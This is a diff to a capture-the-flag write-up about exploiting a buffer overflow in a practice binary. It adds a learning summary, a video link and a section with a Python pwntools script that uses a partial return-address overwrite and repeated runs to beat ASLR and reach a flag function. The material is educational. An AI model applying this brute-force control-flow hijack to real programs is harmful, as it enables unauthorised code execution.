@@ -15,6 +15,21 @@ First up, we'll just get the flag really quickly using a debugger.
 
 Then we'll move on to exploiting a vulnerability in the code such that we can get the flag without the aid of the debugger.
 
+Along the way I learned a _tonne_ of things so I'll try to summarize:
+
+1. Basic gdb automation with pwntools
+2. Basic ret control mechanics
+3. Basic binary R/E with radare2 & gdb
+4. Turning ASLR on and off
+5. Different kinds of binary protection mechanisms provided in Linux
+6. Partial instruction pointer overwrites
+7. ASLR bruteforcing 64bit things
+8. That persistence solves problems
+
+For a visual run through of the following I've uploaded a video
+
+[![binary ctf aslr bruteforce 64bit - spoiler](https://i9.ytimg.com/vi/rz-3hnUiArE/default.jpg?v=5ac0ef30&sqp=COzBhdYF&rs=AOn4CLA8k-oncmO0hxBVisksuuoQJpvZvg)](https://youtu.be/rz-3hnUiArE)
+
 ## Tools
 
 To follow along here you'll want:
@@ -122,17 +137,17 @@ flag{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}
 
 ## Approach #2: overflow exploitation
 
-The buffer overflow theoretically allows a user on a misconfigured system to alter the program flow. My assumption here is that Address Space Layout Randomization (ASLR) is turned off, which negates the protection provided the binary's Position Independent Executable (PIE) flag being set.
+The buffer overflow theoretically allows a user on a misconfigured system to alter the program flow. 
 
 By hooking the debugger we can see that the program flow is interrupted by the segmentation fault, leaving the instruction pointer at the return statement of the AskQuestion function:
 
 ### Turning off ASLR
 
-I did attempt to exploit the buffer overflow without turning off ASLR, but was unable to find a way to do so. I couldn't find a way to ret2plt or ret2libc (not that I'm skilled at doing so) on account of this assembly being Position Independent, thereby randomizing the location of .bss, .plt & .got sections of the assembly. 
+I did attempt to exploit the buffer overflow without turning off ASLR using ret2plt or ret2libc (not that I'm skilled at doing so), however I was not able to do so.  I think this is on account of this assembly being Position Independent, thereby randomizing the location of .bss, .plt & .got sections of the assembly. 
 
-The closest I got was realising that I could 'workaround' ASLR by reading the processes maps file (in /proc/{pid}/maps) to determine the memory location of the binary itself. 
+The closest I got was realising that I could 'bruteforce' ASLR by reducing the potential places in memory to look for the ShowFlag function.
 
-For now though, to check that ASLR is off use
+For now though, to show the basic technique, I'll turn ASLR off:
 ```
 cat /proc/sys/kernel/randomize_va_space
 ```
@@ -220,7 +235,7 @@ Bus error
 
 ```
 
-### Working around ASLR & PIE
+### Cheating our way to ASLR & PIE defeat
 
 The following isn't exactly an ASLR / PIE defeat, however it may provide a workaround for a user with insufficient privilege to turn ASLR completely off. I came across this information when studying the [this BH'16 presentation (PDF)](https://www.blackhat.com/docs/asia-16/materials/asia-16-Marco-Gisbert-Exploiting-Linux-And-PaX-ASLRS-Weaknesses-On-32-And-64-Bit-Systems.pdf) Unfortunately, I couldn't quite figure out how to 'offset2libc' - I'm not sure if it is possible or not.
 
@@ -283,3 +298,63 @@ proc.sendline(buf)
 #bazinga
 proc.interactive()
 ```
+
+### Q: What if we can't read /proc/$pid/maps ?
+
+
+#### A: Bruteforce and a partial IP overwrite
+The answer to this question was elusive to me, as my first instinct was to attempt a brute force attack on the entire memory space. Unfortunately it was like trying to find a needle in a haystack, where each time you go looking for the needle, the entire haystack rearranges itself. I set up my loop overnight, ignoring the math, and hoping, but all it did was warmup my laptop.
+
+After trying, giving up, and trying again, I learned about a thing called a ['partial EIP overwrite'](http://ly0n.me/2015/07/30/bypass-aslr-with-partial-eip-overwrite/) whereby it is possible in some scenario's to only write over the last few lower order bytes in the instruction pointer. This meant that the higher order bytes would remain, and if you were lucky, the small amount of address space that you could call would yield something useful.
+
+
+When I first tried this, I had totally given up on the bruteforce aproach and was looking for a way to ret2somethingUseful and was failing miserably, until it dawned on me that this approach could be used to effectively reduce the amount of places in memory I would have to brute force in order to pop the flag out.
+
+The overwrite approach works because of two things:
+
+1. We only write over the first 3 low order bytes of the Instruction Pointer data - leaving behind the legitimate 3 higher order bytes
+2. Because of the necessity to layout machine code consistently, the first 3 low order nibbles are always the same
+
+The tricky part of an IP overwrite is that depending on circumstances, the end of the string you throw into the binary will probably produce a null character (0x00) and that means you'll get an annoying couple of zeroes in your IP. I.e. don't get the _exact_ address you are looking for.
+
+Effectively this means that all we can do with this here, is reduce the potential memory locations that ShowFlag _could_ be in to a realistic amount of places, and we can then just run the binary over and over again until the underlying operating system picks the memory location we constructed via our exploit. 
+
+Here is how that script looked in the end.
+
+```python
+#!/usr/bin/python2
+import pwn
+ 
+offset = pwn.cyclic_find('faab')
+output = ""
+count = 1
+
+# check if we have the flag yet
+while "flag{" not in output:
+    # open the binary and establish a 'tube'
+    proc = pwn.process('../binary')
+    
+    print "attempt #" + str(count)
+    count += 1
+    
+    # tell pwntools to read in a line and throw it away - this would be the first question asked 
+    proc.recvline()
+    
+    # partial RIP overwrite - low bytes first (little endian)
+    buf = 'B'*offset
+    buf += '\x96\x07'
+    
+    # send the payload
+    proc.sendline(buf)
+    
+    # recieve all output from the bin and wait for an EOF
+    output =  proc.recvall()
+    
+    # close the process and restart the loop
+    proc.close()
+print output
+~                
+```
+
+Using the above code on a 4GB, 2 Core VM I was able to bust out the flag within a few seconds on most attempts - although sometimes I would get unlucky and it would take a few minutes.
+
